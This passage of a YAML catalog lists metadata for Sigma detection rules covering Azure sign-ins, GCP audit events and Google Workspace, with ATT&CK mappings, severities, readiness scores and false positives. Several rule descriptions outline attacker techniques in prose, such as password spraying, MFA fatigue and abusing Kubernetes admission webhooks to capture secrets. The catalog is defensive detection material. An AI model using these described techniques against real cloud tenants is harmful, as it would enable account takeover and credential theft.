  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1110
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1078.004
  - attack.t1110
  time_window: ''
  references:
  - https://web.archive.org/web/20230217071802/https://blooteem.com/march-2022
  - https://www.microsoft.com/en-us/security/blog/2021/10/26/protect-your-business-from-password-sprays-with-microsoft-dart-recommendations/
  false_positives:
  - Known Legacy Accounts
  notes: ''
- detection_id: 248649b7-d64f-46f0-9fb2-a52774166fb5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_app_device_code_authentication.yml
  name: Application Using Device Code Authentication Flow
  description: 'Device code flow is an OAuth 2.0 protocol flow specifically for input
    constrained devices and is not used in all environments.

    If this type of flow is seen in the environment and not being used in an input
    constrained device scenario, further investigation is warranted.

    This can be a misconfigured application or potentially something malicious.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.t1078
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#application-authentication-flows
  false_positives:
  - Applications that are input constrained will need to use device code flow and
    are valid authentications.
  notes: ''
- detection_id: 55695bc0-c8cf-461f-a379-2535f563c854
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_app_ropc_authentication.yml
  name: Applications That Are Using ROPC Authentication Flow
  description: 'Resource owner password credentials (ROPC) should be avoided if at
    all possible as this requires the user to expose their current password credentials
    to the application directly.

    The application then uses those credentials to authenticate the user against the
    identity provider.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.t1078
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.initial-access
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-applications#application-authentication-flows
  false_positives:
  - Applications that are being used as part of automated testing or a legacy application
    that cannot use any other modern authentication flow
  notes: ''
- detection_id: 4afac85c-224a-4dd7-b1af-8da40e1c60bd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_blocked_account_attempt.yml
  name: Account Disabled or Blocked for Sign in Attempts
  description: Detects when an account is disabled or blocked for sign in but tried
    to log in
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - Account disabled or blocked in error
  - Automation account has been blocked or disabled
  notes: ''
- detection_id: b4a6d707-9430-4f5f-af68-0337f52d5c42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_conditional_access_failure.yml
  name: Sign-in Failure Due to Conditional Access Requirements Not Met
  description: Define a baseline threshold for failed sign-ins due to Conditional
    Access failures
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: high
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1110
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1110
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - Service Account misconfigured
  - Misconfigured Systems
  - Vulnerability Scanners
  notes: ''
- detection_id: 60f6535a-760f-42a9-be3f-c9a0a025906e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_legacy_authentication_protocols.yml
  name: Use of Legacy Authentication Protocols
  description: Alert on when legacy authentication has been used on an account
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1110
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1078.004
  - attack.t1110
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - User has been put in acception group so they can use legacy authentication
  notes: ''
- detection_id: 908655e0-25cf-4ae1-b775-1c8ce9cf43d8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_login_to_disabled_account.yml
  name: Login to Disabled Account
  description: Detect failed attempts to sign in to disabled accounts.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - Unknown
  notes: ''
- detection_id: e40f4962-b02b-4192-9bfe-245f7ece1f99
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_mfa_denies.yml
  name: Multifactor Authentication Denied
  description: User has indicated they haven't instigated the MFA prompt and could
    indicate an attacker has the password for the account.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1110
  - T1621
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1078.004
  - attack.t1110
  - attack.t1621
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/
  false_positives:
  - Users actually login but miss-click into the Deny button when MFA prompt.
  notes: ''
- detection_id: 5496ff55-42ec-4369-81cb-00f417029e25
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_mfa_interrupted.yml
  name: Multifactor Authentication Interrupted
  description: Identifies user login with multifactor authentication failures, which
    might be an indication an attacker has the password for the account but can't
    pass the MFA challenge.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1110
  - T1621
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.credential-access
  - attack.t1078.004
  - attack.t1110
  - attack.t1621
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8366030e-7216-476b-9927-271d79f13cf3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_unusual_authentication_interruption.yml
  name: Azure Unusual Authentication Interruption
  description: Detects when there is a interruption in the authentication process.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9a60e676-26ac-44c3-814b-0c2a8b977adf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_user_login_blocked_by_conditional_access.yml
  name: User Access Blocked by Azure Conditional Access
  description: 'Detect access has been blocked by Conditional Access policies.

    The access policy does not allow token issuance which might be sights of unauthorizeed
    login to valid accounts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1110
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.credential-access
  - attack.initial-access
  - attack.t1110
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-privileged-accounts
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5f521e4b-0105-4b72-845b-2198a54487b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/signin_logs/azure_users_authenticating_to_other_azure_ad_tenants.yml
  name: Users Authenticating To Other Azure AD Tenants
  description: Detect when users in your Azure AD tenant are authenticating to other
    Azure AD Tenants.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-user-accounts#monitoring-external-user-sign-ins
  false_positives:
  - If this was approved by System Administrator.
  notes: ''
- detection_id: 32438676-1dba-4ac7-bf69-b86cba995e05
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_access_policy_deleted.yml
  name: GCP Access Policy Deleted
  description: 'Detects when an access policy that is applied to a GCP cloud resource
    is deleted.

    An adversary would be able to remove access policies to gain access to a GCP cloud
    resource.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1098
  time_window: ''
  references:
  - https://cloud.google.com/access-context-manager/docs/audit-logging
  - https://cloud.google.com/logging/docs/audit/understanding-audit-logs
  - https://cloud.google.com/logging/docs/reference/audit/auditlog/rest/Shared.Types/AuditLog
  false_positives:
  - Legitimate administrative activities
  notes: ''
- detection_id: 76737c19-66ee-4c07-b65a-a03301d1573d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_breakglass_container_workload_deployed.yml
  name: GCP Break-glass Container Workload Deployed
  description: 'Detects the deployment of workloads that are deployed by using the
    break-glass flag to override Binary Authorization controls.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548
  time_window: ''
  references:
  - https://cloud.google.com/binary-authorization
  false_positives:
  - Unknown
  notes: ''
- detection_id: e2feb918-4e77-4608-9697-990a1aaf74c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_bucket_enumeration.yml
  name: Google Cloud Storage Buckets Enumeration
  description: Detects when storage bucket is enumerated in Google Cloud.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://cloud.google.com/storage/docs/json_api/v1/buckets
  false_positives:
  - Storage Buckets being enumerated may be performed by a system administrator. Verify
    whether the user identity, user agent, and/or hostname should be making changes
    in your environment.
  - Storage Buckets enumerated from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 4d9f2ee2-c903-48ab-b9c1-8c0f474913d0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_bucket_modified_or_deleted.yml
  name: Google Cloud Storage Buckets Modified or Deleted
  description: Detects when storage bucket is modified or deleted in Google Cloud.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://cloud.google.com/storage/docs/json_api/v1/buckets
  false_positives:
  - Storage Buckets being modified or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Storage Buckets modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 234f9f48-904b-4736-a34c-55d23919e4b7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_dlp_re_identifies_sensitive_information.yml
  name: Google Cloud Re-identifies Sensitive Information
  description: Identifies when sensitive information is re-identified in google Cloud.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1565
  tags:
  - attack.impact
  - attack.t1565
  time_window: ''
  references:
  - https://cloud.google.com/dlp/docs/reference/rest/v2/projects.content/reidentify
  false_positives:
  - Unknown
  notes: ''
- detection_id: 28268a8f-191f-4c17-85b2-f5aa4fa829c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_dns_zone_modified_or_deleted.yml
  name: Google Cloud DNS Zone Modified or Deleted
  description: Identifies when a DNS Zone is modified or deleted in Google Cloud.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://cloud.google.com/dns/docs/reference/v1/managedZones
  false_positives:
  - Unknown
  notes: ''
- detection_id: fe513c69-734c-4d4a-8548-ac5f609be82b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_firewall_rule_modified_or_deleted.yml
  name: Google Cloud Firewall Modified or Deleted
  description: Detects  when a firewall rule is modified or deleted in Google Cloud
    Platform (GCP).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging
  - https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/com/google/api/services/compute/Compute.Firewalls.html
  false_positives:
  - Firewall rules being modified or deleted may be performed by a system administrator.
    Verify that the firewall configuration change was expected.
  - Exceptions can be added to this rule to filter expected behavior.
  notes: ''
- detection_id: 980a7598-1e7f-4962-9372-2d754c930d0e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_full_network_traffic_packet_capture.yml
  name: Google Full Network Traffic Packet Capture
  description: Identifies potential full network packet capture in gcp. This feature
    can potentially be abused to read sensitive data from unencrypted internal traffic.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1074
  tags:
  - attack.collection
  - attack.t1074
  time_window: ''
  references:
  - https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging
  - https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/com/google/api/services/compute/Compute.PacketMirrorings.html
  false_positives:
  - Full Network Packet Capture may be done by a system or network administrator.
  - If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 6ad91e31-53df-4826-bd27-0166171c8040
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_kubernetes_admission_controller.yml
  name: Google Cloud Kubernetes Admission Controller
  description: 'Identifies when an admission controller is executed in GCP Kubernetes.

    A Kubernetes Admission controller intercepts, and possibly modifies, requests
    to the Kubernetes API server.

    The behavior of this admission controller is determined by an admission webhook
    (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys
    in the cluster.

    An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining
    persistence in the cluster.

    For example, attackers can intercept and modify the pod creation operations in
    the cluster and add their malicious container to every created pod. An adversary
    can use the webhook ValidatingAdmissionWebhook, which could be used to obtain
    access credentials.

    An adversary could use the webhook to intercept the requests to the API server,
    record secrets, and other sensitive information.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1552
  - T1552.007
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.t1078
  - attack.credential-access
  - attack.t1552
  - attack.t1552.007
  time_window: ''
  references:
  - https://cloud.google.com/kubernetes-engine/docs
  false_positives:
  - Google Cloud Kubernetes Admission Controller may be done by a system administrator.
  - If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: cd3a808c-c7b7-4c50-a2f3-f4cfcd436435
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_kubernetes_cronjob.yml
  name: Google Cloud Kubernetes CronJob
  description: 'Identifies when a Google Cloud Kubernetes CronJob runs in Azure Cloud.
    Kubernetes Job is a controller that creates one or more pods and ensures that
    a specified number of them successfully terminate.

    Kubernetes Job can be used to run containers that perform finite tasks for batch
    jobs. Kubernetes CronJob is used to schedule Jobs.

    An Adversary may use Kubernetes CronJob for scheduling execution of malicious
    code that would run as a container in the cluster.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.execution
  time_window: ''
  references:
  - https://cloud.google.com/kubernetes-engine/docs
  - https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/
  - https://kubernetes.io/docs/concepts/workloads/controllers/job/
  false_positives:
  - Google Cloud Kubernetes CronJob/Job may be done by a system administrator.
  - If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 0322d9f2-289a-47c2-b5e1-b63c90901a3e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_kubernetes_rolebinding.yml
  name: Google Cloud Kubernetes RoleBinding
  description: Detects the creation or patching of potential malicious RoleBinding.
    This includes RoleBindings and ClusterRoleBinding.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - risk_scoring_or_weighting
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://github.com/elastic/detection-rules/pull/1267
  - https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/cluster-role-v1/#ClusterRole
  - https://cloud.google.com/kubernetes-engine/docs/how-to/role-based-access-control
  - https://kubernetes.io/docs/reference/access-authn-authz/rbac/
  - https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging
  false_positives:
  - RoleBindings and ClusterRoleBinding being modified or deleted may be performed
    by a system administrator. Verify whether the user identity, user agent, and/or
    hostname should be making changes in your environment.
  - RoleBindings and ClusterRoleBinding modified or deleted from unfamiliar users
    should be investigated. If known behavior is causing false positives, it can be
    exempted from the rule.
  notes: ''
- detection_id: 2f0bae2d-bf20-4465-be86-1311addebaa3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_kubernetes_secrets_modified_or_deleted.yml
  name: Google Cloud Kubernetes Secrets Modified or Deleted
  description: Identifies when the Secrets are Modified or Deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging
  false_positives:
  - Secrets being modified or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Secrets modified or deleted from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 13f81a90-a69c-4fab-8f07-b5bb55416a9f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_service_account_disabled_or_deleted.yml
  name: Google Cloud Service Account Disabled or Deleted
  description: Identifies when a service account is disabled or deleted in Google
    Cloud.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1531
  tags:
  - attack.impact
  - attack.t1531
  time_window: ''
  references:
  - https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts
  false_positives:
  - Service Account being disabled or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Service Account disabled or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 6b67c12e-5e40-47c6-b3b0-1e6b571184cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_service_account_modified.yml
  name: Google Cloud Service Account Modified
  description: Identifies when a service account is modified in Google Cloud.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts
  false_positives:
  - Service Account being modified may be performed by a system administrator. Verify
    whether the user identity, user agent, and/or hostname should be making changes
    in your environment.
  - Service Account modified from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: f346bbd5-2c4e-4789-a221-72de7685090d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_sql_database_modified_or_deleted.yml
  name: Google Cloud SQL Database Modified or Deleted
  description: Detect when a Cloud SQL DB has been modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://cloud.google.com/sql/docs/mysql/admin-api/rest/v1beta4/users/update
  false_positives:
  - SQL Database being modified or deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - SQL Database modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 99980a85-3a61-43d3-ac0f-b68d6b4797b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/audit/gcp_vpn_tunnel_modified_or_deleted.yml
  name: Google Cloud VPN Tunnel Modified or Deleted
  description: Identifies when a VPN Tunnel Modified or Deleted in Google Cloud.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: gcp.audit
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://any-api.com/googleapis_com/compute/docs/vpnTunnels
  false_positives:
  - VPN Tunnel being modified or deleted may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - VPN Tunnel modified or deleted from unfamiliar users should be investigated. If
    known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 22f2fb54-5312-435d-852f-7c74f81684ca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/gworkspace/gcp_gworkspace_application_access_levels_modified.yml
  name: Google Workspace Application Access Level Modified
  description: 'Detects when an access level is changed for a Google workspace application.

    An access level is part of BeyondCorp Enterprise which is Google Workspace''s
    way of enforcing Zero Trust model.

    An adversary would be able to remove access levels to gain easier access to Google
    workspace resources.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: google_workspace.admin
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1098.003
  time_window: ''
  references:
  - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-application-settings
  - https://support.google.com/a/answer/9261439
  false_positives:
  - Legitimate administrative activities changing the access levels for an application
  notes: ''
- detection_id: ee2803f0-71c8-4831-b48b-a1fc57601ee4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/gworkspace/gcp_gworkspace_application_removed.yml
  name: Google Workspace Application Removed
  description: Detects when an an application is removed from Google Workspace.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: gcp
  product: google_workspace.admin
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3
  - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings?hl=en#REMOVE_APPLICATION
  - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings?hl=en#REMOVE_APPLICATION_FROM_WHITELIST
  false_positives:
  - Application being removed may be performed by a System Administrator.
  notes: ''
- detection_id: 04e2a23a-9b29-4a5c-be3a-3542e3f982ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/gworkspace/gcp_gworkspace_granted_domain_api_access.yml
  name: Google Workspace Granted Domain API Access
  description: Detects when an API access service account is granted domain authority.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: gcp
  product: google_workspace.admin
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://cloud.google.com/logging/docs/audit/gsuite-audit-logging#3
  - https://developers.google.com/admin-sdk/reports/v1/appendix/activity/admin-domain-settings#AUTHORIZE_API_CLIENT_ACCESS
  false_positives:
  - Unknown
  notes: ''
- detection_id: 780601d1-6376-4f2a-884e-b8d45599f78c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/gcp/gworkspace/gcp_gworkspace_mfa_disabled.yml
  name: Google Workspace MFA Disabled
